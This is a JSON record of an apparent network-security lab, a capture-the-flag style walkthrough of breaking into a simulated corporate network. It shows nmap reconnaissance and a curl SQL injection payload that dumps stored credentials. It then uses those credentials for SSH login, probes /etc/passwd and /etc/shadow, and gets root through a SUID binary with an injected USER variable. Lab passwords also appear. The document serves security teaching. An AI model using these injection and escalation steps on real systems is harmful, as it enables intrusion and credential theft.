{"description":"Network Security project about SSH, Database and SQL Injection.","goal":"<p>git@github.com:Tony177/DSP_Repo.gitHack through a complex enterprise system but be careful not to be traced!</p>\n<p>Traverse the complex corporate network by exploiting common protocols and services, such as HTTP, SSH and MySQL.</p>","solution":"<h1>Instruction: what to do</h1>\n<ol>\n<li>Footprinting: gather information online about the organization</li>\n<li>Scanning: scan vulnerable point of access</li>\n<li>Enumeration: probing more intrusive of vulnerable services</li>\n<li>Exploitation: attacking those potential vulnerability</li>\n</ol>\n<h1>Footprinting</h1>\n<p>In this case scenario we're already connected to the local network, so we've already gathered enough information about our target.</p>\n<p>We start by finding out our IP address on the networks using `ifconfig` command:</p>\n<p><img src=\"https://raw.githubusercontent.com/Tony177/NetworkSecurity-Project/main/Image/ifconfig_bob.png\" alt=\"ifconfig_bob\" width=\"500\" height=\"308\" /></p>\n<p>Then, we discover some IPs using then `nmap` tool with these options:</p>\n<p>&nbsp;</p>\n<ul>\n<li>&ldquo;-sn&rdquo; means &ldquo;no port scan&rdquo;&nbsp;</li>\n<li>&ldquo;-PE&rdquo; sends ICMP Echo Request.</li>\n<li>&ldquo;--send-ip&rdquo; to not send ARP packets.</li>\n</ul>\n<p><span style=\"font-family: -webkit-standard; font-size: medium;\">Company Network:</span></p>\n<p>&nbsp;</p>\n<p><img src=\"https://raw.githubusercontent.com/Tony177/NetworkSecurity-Project/main/Image/footprinting_company_network.png\" alt=\"footprinting_company_network\" width=\"500\" height=\"147\" /></p>\n<p><span style=\"font-family: -webkit-standard; font-size: medium;\">&nbsp;Employee Network:</span></p>\n<p><img src=\"https://raw.githubusercontent.com/Tony177/NetworkSecurity-Project/main/Image/footprinting_employee_network.png\" alt=\"footprinting_employee_network\" width=\"500\" height=\"142\" /></p>\n<p>&nbsp;</p>\n<h1>Scanning</h1>\n<p>We're interested in the Web Server and in Tom PC, so we can scan more aggressively them to find information about any open ports.</p>\n<p>If we use simply a TPC SYN scan from nmap, we find vague information:</p>\n<p><img src=\"https://raw.githubusercontent.com/Tony177/NetworkSecurity-Project/main/Image/scanning_company_ss.PNG\" alt=\"scanning_company_ss\" width=\"500\" height=\"229\" /></p>\n<p><img src=\"https://raw.githubusercontent.com/Tony177/NetworkSecurity-Project/main/Image/scanning_employee_ss.PNG\" alt=\"scanning_employee_ss\" width=\"500\" height=\"156\" /></p>\n<h1>Enumeration</h1>\n<p>Instead, if we explore deeply with a Version Detection scan through nmap, we can obtain service fingerprints on the hosts:&nbsp;</p>\n<p>&nbsp;<img src=\"https://raw.githubusercontent.com/Tony177/NetworkSecurity-Project/main/Image/enumeration_company_sv.PNG\" alt=\"enumeration_company_sv\" width=\"500\" height=\"180\" />&nbsp;</p>\n<p>The web server is implemented with NodeJS on port 8080 and has a connection with a MySQL database.</p>\n<p>Meanwhile on Tom PC, we found an OpenSSH port:</p>\n<p>&nbsp;<img src=\"https://raw.githubusercontent.com/Tony177/NetworkSecurity-Project/main/Image/enumeration_tom_sv.PNG\" alt=\"enumeration_tom_sv\" width=\"500\" height=\"176\" /></p>\n<p>Firstly, we explore the website on the Web Server to find vulnerabilities, then exploit the OpenSSH port on Tom PC.</p>\n<p>We retrieved the html page using `curl`, which contains a login form, that we can try to exploit.</p>\n<p>&nbsp;<img src=\"https://raw.githubusercontent.com/Tony177/NetworkSecurity-Project/main/Image/webserver_curl.png\" alt=\"webserver_curl\" width=\"500\" height=\"290\" />&nbsp;</p>\n<h1>Exploitation</h1>\n<p>We can try some usual combination for the form:</p>\n<pre>curl -X POST -d 'username=&amp;password=b' 193.20.3.1:8080</pre>\n<p>Which returns \"Error value(s) missing\"</p>\n<pre>curl -X POST -d 'username=a&amp;password=b' 193.20.3.1:8080</pre>\n<p>Which returns&nbsp;</p>\n<pre>`{\"success\":false,\"response\":\"No user found\",\"result\":[]}`</pre>\n<p>Lastly, we can try one with MySQL injection using OR and commenting syntax:&nbsp;</p>\n<p>&nbsp;</p>\n<pre>curl -X POST -d 'username=\" OR 1&lt;2; -- &amp;password=b' 193.20.3.1:8080</pre>\n<p>&nbsp;</p>\n<p>which returns a list of credentials:</p>\n<p><img src=\"https://raw.githubusercontent.com/Tony177/NetworkSecurity-Project/main/Image/webserver_sql.png\" alt=\"webserver_sql\" width=\"700\" height=\"295\" /></p>\n<p>&nbsp;</p>\n<p>including only one entry related to a user named Tom with credentials:</p>\n<p>&nbsp;</p>\n<pre>username = tcasaccio1<br /><br />password = YLN1NrMdGN&nbsp;</pre>\n<h1>SSH Access</h1>\n<p>Now that we have gathered this information, we can try using the credentials above to gain access to the open SSH port on Tom PC.</p>\n<p>We can log in using:</p>\n<p>&nbsp;</p>\n<pre>ssh tcasaccio1@193.20.1.3</pre>\n<p>&nbsp;</p>\n<h2>Privilege Escalation Procedure</h2>\n<p>From the ssh entrypoint on TomPC, we can trace our privileges on the machine and which files we can access:</p>\n<p>&nbsp;<img src=\"https://raw.githubusercontent.com/Tony177/NetworkSecurity-Project/main/Image/privilege_escalation_whoami.PNG\" alt=\"privilege_escalation_whoami\" width=\"400\" height=\"198\" /></p>\n<p>&nbsp;</p>\n<p>As we can see, user tcasaccio1 doesn't belong to sudo group, let's see if we can access to /etc/passwd and then to /etc/shadow to retrieve hashed passwords:</p>\n<p><img src=\"https://raw.githubusercontent.com/Tony177/NetworkSecurity-Project/main/Image/privilege_escalation_passwd.PNG\" alt=\"privilege_escalation_passwd\" width=\"500\" height=\"341\" /></p>\n<p>&nbsp;</p>\n<p>We have to find another way to gain elevated privileges, let's find files with the SUID bit set:</p>\n<p><img src=\"https://raw.githubusercontent.com/Tony177/NetworkSecurity-Project/main/Image/privilege_escalation_suid.PNG\" alt=\"privilege_escalation_suid\" width=\"400\" height=\"161\" />&nbsp;</p>\n<p><img src=\"https://raw.githubusercontent.com/Tony177/NetworkSecurity-Project/main/Image/privilege_escalation_suid2.PNG\" alt=\"privilege_escalation_suid2\" width=\"500\" height=\"159\" />&nbsp;</p>\n<p>The Set User IDentity bit allows users to run executables with the file system permissions of the executable's owner to perform a specific task, in this case with root privileges.</p>\n<p>In /home/tcasaccio1 there is a file with the SUID bit set, let's see if we can exploit this program:</p>\n<p><img src=\"https://raw.githubusercontent.com/Tony177/NetworkSecurity-Project/main/Image/privilege_escalation_program.PNG\" alt=\"privilege_escalation_program\" width=\"500\" height=\"420\" />&nbsp;&nbsp;</p>\n<p>In this case, we can modify the USER environment variable by creating an environment variable injection.</p>\n<p>&nbsp;</p>\n<pre>export USER=\"; /bin/bash; echo \":tcasaccio1</pre>\n<p>Obtaining this behaviour by the program:</p>\n<p><img src=\"https://raw.githubusercontent.com/Tony177/NetworkSecurity-Project/main/Image/privilege_escalation_exploit.PNG\" alt=\"privilege_escalation_exploit\" width=\"500\" height=\"123\" /></p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>So now we have root permissions on the machine.</p>\n<p>&nbsp;</p>","readme":"# NetworkSecurity-Project\n\nNetwork Security project about SSH, Database and SQL Injection.\n\n# Network Scheme\n\n<img src=\"https://raw.githubusercontent.com/Tony177/NetworkSecurity-Project/main/Image/network_scheme.svg\" width=500>\n\n-   Web Network nodes:\n    1. Web Server hosting a stub website using NodeJS.\n    2. MySQL Server hosting sensitive information.\n-   Employee Network nodes:\n    1. BobPC which represents the hacker host.\n    2. TomPC which represents the target host.\n-   Company Network nodes:\n    1. All the Employee network nodes.\n    2. Web Server.\n\n# Background Scenario\n\nThis lab is about industrial espionage, represented by the attacker Bob, who is infiltrated inside a company lan network and has found, among a lot of devices, one vulnerable computer that belongs to Tom and an useful website open ONLY inside the company network.\n\nDuring the demonstration scenario, we discovered these IPs from 2 different subnets:\n\n-   _193.20.3.1_ - Company Network \n-   _193.20.3.2_ - Bob PC on company network\n\n-   _193.20.1.1_ - Employee Network\n-   _193.20.1.2_ - Bob PC on employee network\n-   _193.20.1.3_ - Tom PC on employee network\n\nAnd we don't have any access to the Web network.\n\n# Start\n\nIn order to start this Lab, you've to connect to BobPC with ssh, on your local machine run in any console this command:\n```bash\nssh kali@localhost -p 2222\n```\nand as password insert \"_*kali*_\".\n\nNow you're connected to BobPC, start the hacking!","author":"Tony177"}
